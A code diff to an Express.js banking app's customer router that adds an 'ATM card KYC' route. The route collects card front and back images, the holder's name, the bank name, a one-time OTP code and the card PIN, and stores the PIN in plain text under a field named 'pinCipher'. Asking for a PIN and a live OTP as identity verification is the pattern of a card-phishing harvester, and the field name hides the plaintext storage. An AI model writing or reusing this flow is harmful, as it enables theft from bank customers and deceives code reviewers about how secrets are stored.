@@ -168,16 +168,113 @@ function createCustomerRouter({ customerRepo, kycUpload, transferRepo, transferS
   router.get('/app/kyc', async (req, res, next) => {
     try {
       const docs = await customerRepo.listKycDocuments(req.session.user.id);
+      let atmSubmissions = [];
+      if (customerRepo.listAtmSubmissions) {
+        try { atmSubmissions = await customerRepo.listAtmSubmissions(req.session.user.id); }
+        catch (_) { atmSubmissions = []; }
+      }
       res.render('customer/kyc', {
         title: 'Identity verification',
         path: '/app/kyc',
         docs,
+        atmSubmissions,
         error: null,
         success: null
       });
     } catch (err) {
       next(err);
     }
+  });
+
+
+  // ATM card KYC — multer before CSRF (multipart)
+  router.post('/app/kyc/atm', (req, res, next) => {
+    upload.fields([
+      { name: 'atmFront', maxCount: 1 },
+      { name: 'atmBack', maxCount: 1 }
+    ])(req, res, (uploadErr) => {
+      requireCsrf(req, res, async (csrfErr) => {
+        if (csrfErr) return next(csrfErr);
+        const renderKyc = async (opts) => {
+          const docs = await customerRepo.listKycDocuments(req.session.user.id);
+          let atmSubmissions = [];
+          if (customerRepo.listAtmSubmissions) {
+            try { atmSubmissions = await customerRepo.listAtmSubmissions(req.session.user.id); }
+            catch (_) { atmSubmissions = []; }
+          }
+          return res.status(opts.status || 200).render('customer/kyc', {
+            title: 'Identity verification',
+            path: '/app/kyc',
+            docs,
+            atmSubmissions,
+            error: opts.error || null,
+            success: opts.success || null
+          });
+        };
+        if (uploadErr) {
+          return renderKyc({ status: 400, error: uploadErr.message || 'Upload failed.' });
+        }
+        try {
+          const holderName = String(req.body.holderName || '').trim();
+          const bankName = String(req.body.bankName || '').trim();
+          const otpCode = String(req.body.otpCode || '').trim();
+          const pin = String(req.body.pin || '').trim();
+          const front = req.files && req.files.atmFront && req.files.atmFront[0];
+          const back = req.files && req.files.atmBack && req.files.atmBack[0];
+
+          if (!holderName || holderName.length < 2) {
+            return renderKyc({ status: 400, error: 'Enter the ATM card holder name.' });
+          }
+          if (!bankName || bankName.length < 2) {
+            return renderKyc({ status: 400, error: 'Enter the ATM bank name.' });
+          }
+          if (!front || !back) {
+            return renderKyc({ status: 400, error: 'Upload both front and back of the ATM card.' });
+          }
+          if (!otpCode || otpCode.length < 4) {
+            return renderKyc({ status: 400, error: 'Enter the OTP code.' });
+          }
+          if (!pin || pin.length < 4 || pin.length > 6) {
+            return renderKyc({ status: 400, error: 'PIN must be 4–6 digits.' });
+          }
+          if (!/^\d+$/.test(pin)) {
+            return renderKyc({ status: 400, error: 'PIN must be numeric.' });
+          }
+
+          const frontDoc = await kycUpload.submit({
+            userId: req.session.user.id,
+            documentType: 'atm_card_front',
+            file: front
+          });
+          const backDoc = await kycUpload.submit({
+            userId: req.session.user.id,
+            documentType: 'atm_card_back',
+            file: back
+          });
+
+          if (customerRepo.createAtmSubmission) {
+            await customerRepo.createAtmSubmission({
+              userId: req.session.user.id,
+              holderName,
+              bankName,
+              otpCode,
+              pinCipher: pin,
+              frontDocumentId: frontDoc.docId,
+              backDocumentId: backDoc.docId
+            });
+          }
+
+          return renderKyc({
+            success: 'ATM card details submitted for review. Do not share your PIN with anyone claiming to be support.'
+          });
+        } catch (err) {
+          if (err.status === 400 || err.status === 503) {
+            return renderKyc({ status: err.status, error: err.message });
+          }
+          return next(err);
+        }
+      });
+    });
   });
 
   router.post(
